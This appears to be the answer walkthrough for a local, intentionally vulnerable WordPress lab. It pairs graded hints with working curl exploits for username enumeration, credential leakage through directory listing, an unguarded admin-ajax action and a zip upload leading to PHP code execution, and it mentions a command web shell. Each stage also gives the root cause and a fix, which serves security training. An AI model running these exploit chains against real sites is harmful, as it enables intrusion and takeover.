SOLUTION.md — Staff Portal Lab Walkthrough


⚠️ Spoilers ahead. This file contains the full intended solution for every
vulnerability in the lab. Only open it if you're stuck, or after you've had a
genuine attempt. If you're the one grading/attempting the lab, try the
Progressive Hints section first — it's designed to unstick you one step at
a time without giving the whole answer away.

Everything here assumes the lab is running locally at http://localhost:8080
per the README quick start. Authorized lab use only.




Progressive Hints (read only as far as you need)

<details>
<summary><b>Vuln 1 — I can't find any valid usernames</b></summary>

Hint 1: The interesting endpoint is one that stock WordPress also exposes but that this lab has modified. Think xmlrpc.php.
Hint 2: There's a custom XML-RPC method, not a standard one. Its name starts with staffportal..
Hint 3: Send a methodCall for staffportal.checkUser with a username. Compare the response for a name you know is real vs. obvious junk — the shape of the two responses differs.


</details>
<details>
<summary><b>Vuln 2 — Where are the leaked credentials?</b></summary>

Hint 1: The web server is misconfigured to let you browse folders that should not be listable.
Hint 2: Look under wp-content/uploads/. Something that shouldn't be public lives in a sub-folder there.
Hint 3: Browse to wp-content/uploads/backups/. Download the archive and read the text files inside.


</details>
<details>
<summary><b>Vuln 3 — How do I act as an admin from a normal account?</b></summary>

Hint 1: You do not need to become an admin. A plain logged-in user is enough.
Hint 2: The custom plugin exposes an admin-ajax action that only checks whether you're logged in, not what role you have.
Hint 3: Log in with the leaked creds, then POST to wp-admin/admin-ajax.php with action=staffportal_publish_announcement.


</details>
<details>
<summary><b>Vuln 4 — How do I get code execution?</b></summary>

Hint 1: The same plugin has a second broken action that takes a file upload.
Hint 2: Whatever .zip you send gets extracted straight into wp-content/plugins/ with no validation.
Hint 3: Put a .php file inside a zip, upload it via action=staffportal_import_template, then request that PHP file directly under wp-content/plugins/.


</details>

Full Walkthrough

Each stage below follows the same structure: discover → exploit → confirm → root cause → fix. The whole chain is also automated in exploit_chain.py if you want a one-shot PASS/FAIL check.

Vuln 1 — XML-RPC username enumeration

Exploit

bash# A username that exists -> success string
curl -s http://localhost:8080/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall><methodName>staffportal.checkUser</methodName>
<params><param><value><string>jsmith</string></value></param></params></methodCall>'

# A username that does not -> 404 fault
curl -s http://localhost:8080/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall><methodName>staffportal.checkUser</methodName>
<params><param><value><string>ghost</string></value></param></params></methodCall>'

Confirm: a valid user returns KNOWN_STAFF_ACCOUNT: <name>; an invalid one returns a faultCode 404. Wordlist through candidate names and keep everything that returns the success string. Valid accounts in this lab: admin, jsmith, akumar, mlee.

Root cause: the staffportal-xmlrpc-enum mu-plugin registers a custom method that branches on username_exists() and returns observably different responses for hit vs. miss.

Fix: don't expose an oracle that distinguishes valid from invalid usernames. Return an identical, generic response either way (and ideally don't register such a method at all). Disable XML-RPC if unused.

Vuln 2 — Directory listing → leaked credentials

Exploit

bash# The folder is browsable instead of returning 403
curl -s http://localhost:8080/wp-content/uploads/backups/ | grep -i '\.zip'

# Grab and open the backup
curl -s -O http://localhost:8080/wp-content/uploads/backups/portal_backup_2024-03.zip
unzip -p portal_backup_2024-03.zip 'backup_contents/credentials.txt'

Confirm: the folder returns an Apache autoindex (HTTP 200 with a file listing) rather than 403 Forbidden, and the extracted credentials.txt reveals a low-privilege staff login. Keep these creds for stages 3 and 4.

Root cause: directory-listing.conf sets Options +Indexes on the uploads directory, so any folder without an index file is fully browsable.

Fix: remove Options +Indexes (use Options -Indexes), and never store credential-bearing backups under the web root.

Vuln 3 — Broken access control (privilege escalation)

Exploit

bash# Log in as the low-priv staff user, save the session
curl -s -c cookies.txt \
  --data-urlencode 'log=jsmith' \
  --data-urlencode 'pwd=Summer2024!' \
  --data 'wp-submit=Log In' \
  --data 'testcookie=1' \
  --cookie 'wordpress_test_cookie=WP Cookie check' \
  http://localhost:8080/wp-login.php -o /dev/null

# Perform an admin-only content action as a subscriber
curl -s -b cookies.txt \
  --data 'action=staffportal_publish_announcement' \
  --data 'title=Unauthorized announcement' \
  --data 'body=Published by a subscriber-level account.' \
  http://localhost:8080/wp-admin/admin-ajax.php

Confirm: the response is Announcement published as post ID <n>, and the post is live on the site front page — even though a subscriber normally cannot publish.

Root cause: the staffportal_publish_announcement handler checks only is_user_logged_in(). It never calls current_user_can(...), so any authenticated user passes the gate.

Fix: gate the action on a capability, e.g. if ( ! current_user_can( 'publish_posts' ) ) wp_die( '', 403 );, and add a nonce (check_ajax_referer) to stop CSRF.

Vuln 4 — Insecure plugin upload → RCE

The goal is to prove that attacker-supplied PHP runs on the server. The clean way to demonstrate this is a benign proof-of-execution plugin — it proves the vulnerability without leaving a live command shell sitting in the plugins folder.

Build a proof plugin (rce-poc.php inside a folder, zipped):

php<?php
/*
Plugin Name: RCE PoC (Lab Only)
Description: Benign proof that uploaded PHP executes on the server.
Version: 1.0
*/
header('Content-Type: text/plain');
echo "RCE-PROOF-8f3a2c | php=" . PHP_VERSION
   . " | os_user=" . (function_exists('posix_getpwuid')
        ? posix_getpwuid(posix_geteuid())['name'] : get_current_user())
   . " | uname=" . php_uname('s') . "\n";

bashmkdir rce-poc && mv rce-poc.php rce-poc/
zip -r rce-poc.zip rce-poc

Upload it as the low-priv user and trigger it (reuse cookies.txt from stage 3):

bashcurl -s -b cookies.txt \
  -F 'action=staffportal_import_template' \
  -F 'template_pack=@rce-poc.zip' \
  http://localhost:8080/wp-admin/admin-ajax.php ; echo

curl -s http://localhost:8080/wp-content/plugins/rce-poc/rce-poc.php

Confirm: the final request prints something like
RCE-PROOF-8f3a2c | php=8.2.x | os_user=www-data | uname=Linux.
The marker appearing proves your uploaded PHP executed; os_user=www-data
shows it ran with the web server's privileges — that's the RCE.


The same upload primitive trivially extends to interactive command execution
(a system($_GET['cmd']) shell), which is what exploit_chain.py uses to
print id. That's fine inside this disposable local lab, but treat any such
shell as lab-only: don't let the zip or extracted file leave the
container, and tear down with docker compose down -v when finished so it
isn't left reachable between runs. The benign marker above makes the same
point for a write-up without leaving a usable backdoor behind.



Root cause: staffportal_import_template checks only is_user_logged_in(),
then unzips arbitrary uploaded content straight into WP_PLUGIN_DIR and
auto-activates it — no capability check, no nonce, no file-type/content
validation. WordPress serves .php files in that directory directly, so the
code runs on the next request.

Fix: require current_user_can('install_plugins') and a valid nonce; never
extract untrusted archives into an executable directory; validate archive
contents; and use WordPress's own vetted plugin-install flow rather than a
custom unzip.
